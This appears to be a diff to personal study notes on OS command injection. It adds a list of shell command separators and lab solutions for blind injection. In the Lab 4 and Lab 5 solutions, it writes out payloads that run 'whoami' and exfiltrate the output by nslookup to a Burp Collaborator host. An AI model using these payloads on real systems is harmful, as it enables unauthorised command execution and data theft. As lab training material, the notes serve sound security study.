@@ -34,7 +34,7 @@ How to detect ?
 > 
 > TIP - Exfiltrate the output of your command 
 > 
-> ```https://vulnerable-website/endpointparameter=||nslookup+`whoami`.burp.collaborator.address||```
+> ```https://vulnerable-website/endpointparameter=||nslookup `whoami`.burp.collaborator.address||```
 
 #### Some vulnearble functions - 
 
@@ -64,6 +64,28 @@ How to detect ?
 -   run
 -   print
 ```
+## Ways ton inject commands 
+
+A variety of shell metacharacters can be used to perform OS command injection attacks.
+
+A number of characters function as command separators, allowing commands to be chained together. The following command separators work on **both Windows and Unix**-based systems:
+
+`&`
+`&&`
+`|`
+`||`
+
+The following command separators work **only on Unix**-based systems:
+
+- `;`
+- `Newline (0x0a or \n)`
+- 
+On Unix-based systems, you can also use `backticks or the dollar character` to perform inline execution of an injected command within the original command:
+
+- `injected command `
+
+- `$(injected command )`
+
 
 
 
@@ -196,6 +218,52 @@ To find where the filename parameter is , we can check the `HTTP history tab` , 
 Transfer the request to Repeater tab. We modify the `filename = op.txt` & in the response we get the username !
 
 ![image](https://user-images.githubusercontent.com/67383098/225297876-b1d95b58-f28f-4935-beb5-0f09148738fa.png)
+
+
+-----------------------------------------------------------------------
+
+# Lab 4 - Blind OS command injection with out-of-band data exfiltration
+
+```
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
+```
+### Solution - 
+
+We first create a external server ie . collaborator server.
+
+![image](https://user-images.githubusercontent.com/67383098/225314001-fc343a73-6fc5-498a-8ea8-bbaab4682c33.png)
+
+Copy the collaborator server link - `http://zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net/`
+
+Paste the payload ` & nslookup zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` (URL - encode ) in the email parameter .
+
+![image](https://user-images.githubusercontent.com/67383098/225314704-8214e8e5-af55-4af7-af05-81e0fcb4c061.png)
+
+Now click SEND button, click `POLL NOW button in `burp collaborator` ,
+
+![image](https://user-images.githubusercontent.com/67383098/225315163-0dcaaa6d-3962-410f-91e4-725784cfdd96.png)
+
+
+----------------------------------------------------------
+
+# Lab  5 - Blind OS command injection with out-of-band data exfiltration (Running commands like whoami)
+
+`To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.`
+
+
+### Solution - 
+
+Same process as above but add this payload ` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` or ` & nslookup $(whoami0.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # `
+
+We get the username in the details panel
+
+![image](https://user-images.githubusercontent.com/67383098/225319008-28f90fcf-53d6-4237-b84d-bcd563b8a882.png)
+
+
 
 
 
